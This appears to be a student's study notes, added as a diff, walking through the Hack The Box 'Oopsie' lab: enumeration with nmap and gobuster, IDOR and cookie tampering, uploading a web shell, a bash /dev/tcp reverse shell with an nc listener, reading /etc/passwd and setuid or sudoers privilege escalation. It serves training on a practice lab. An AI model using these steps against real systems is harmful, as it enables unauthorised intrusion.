@@ -1,0 +1,74 @@
+Jan. 29, 2024
+
+Final goal does not have to be root access
+can be more imaginative and instead get access to sensitive files
+
++ HTB walkthrough #1
+- getting started 
+  - install openvpn on your kali if its not already there 
+    - using openvpn is easier to use than their web based system 
+  - get an account for HTB Labs
+  - go to "Starting Point"
+  - select "Connect to HTB" and (the first time) download
+      an OpenVPN configuration file (it will be called
+      starting_point_YOURUSERNAME.ovpn
+  - (take a look at "ip a")
+  - in a terminal, "sudo openvpn starting_point_YOURUSERNAME.ovpn"
+      leave that terminal as is
+  - (take another look at "ip a" -- change?)
+  - go to the box you want to hack, and click "Spawn"; wait until
+      it shows you an IP address
+  - note that about half the boxes are "VIP"--you have to have
+      a paid subscription to try them
+
+- Starting Point / Tier2 / Oopsie
+  - sudo openvpn shared/starting_point_username.ovpn
+  - nmap to find the open ports 
+  - you can set an enviornment variable
+    - IP=ipaddress
+    - ping $IP
+  - http://ipaddress
+  - cat gobuster-big 
+    - did a gobuster with the big.txt file
+    - status 301 is a redirect
+      - if you do it without a slash, means it does not exist 
+      - with the slash, gives 403 which indicates that you do not have access
+    - status 403 means the files may or may not be there, do not have access
+    - see that index.php exists which indicates that it is a php site
+  - gobuster dir -u http://ipaddress  -w /usr/share/wordlists/dirb/big.txt -o gobuster-big -x php,txt,pdf
+    - fuzzing tool: throw whatever you can at it and see what sticks/ works
+    - the -x tag also indicates that in addition to trying all the words in the wordlist, also try sticking a php,txt,pdf at the end of each file
+    - may also try to look for aspx, asp, ini, for windows systems
+  - view source
+  - search for href, search for src
+     - there are many tags in html that refer to other docs
+  - ipaddress/cdn-cgi/login/
+    - can look at the source code, go to burpsuite
+    - from burpsuite we gather that when we try to login, it does a post to the page
+  - in the url, change the id to see if there are any other accounts
+    - found something in 1, admin
+    - the burpsuite, reveals cookies 
+  - change the cookies in the browser based on the account given
+    - gives access to the upload section
+  - upload a reverse shell through the upload section
+  - use the url to find your reverse shell file
+  - use the url to write your commands (test with cmd=whoami)
+  - bash -c "bash -i >&/dev/tcp/$IP/4444 0>&1" 
+  - nc -lvnp 4444 (set up a listener) 
+    - type the bash line into the url
+  - now have reverse shell
+  - cat /etc/passwd (to find the different users) 
+  - can navigate into one of the users and access that users profile
+  - since we are logged in as www-data, we can see all the different files pertaining to the site (js, css, etc.) 
+  - privlige escalation to figure out how to get to root
+  - if the program more or less runs when opening a file, or program that is run as root, you can open a shell within that program 
+    - the shell run within a program that is run as root will also run as root
+
+example for things to prepare for:
+- "we see that there is a setuid vulnerability. can you tell me about what setuid is? what is it used for?"
+- "session ids, how are they maintained?"
+
+- Starting Point / Tier2 / Markup
+  - just a little piece of this to demo a sudoers vulnerability
+  - don't forget to "cat /etc/sudoers" once you have root, to see what's up
+
